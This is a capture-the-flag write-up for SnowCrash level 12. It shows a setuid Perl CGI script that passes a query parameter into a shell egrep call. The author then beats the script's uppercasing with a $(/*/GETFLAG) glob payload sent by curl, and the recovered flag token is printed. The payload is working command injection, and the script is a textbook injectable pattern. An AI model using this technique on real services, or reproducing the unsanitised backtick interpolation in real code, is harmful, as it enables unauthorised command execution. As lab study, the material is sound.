# Flag 12

In levele12 we have a perl script that that expect two queries x & y and serve html/text file on port 4646.

```
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));

```
The script only using the x param after capitalizing it's charachters and removing all spaces and what's come after them after that it excutes egrep command using the result, so if we get to give it our getflag command without using space or lowerccae charachters we will get our flag.

```
level12@SnowCrash:~$ echo "getflag > /tmp/flag12" > /tmp/GETFLAG && chmod +x /tmp/GETFLAG
level12@SnowCrash:~$ curl -X GET "localhost:4646/?x=\$(/*/GETFLAG)"
..level12@SnowCrash:~$ cat /tmp/flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr

```

With the same commands we can get the level04 flag, we need just to change the port.

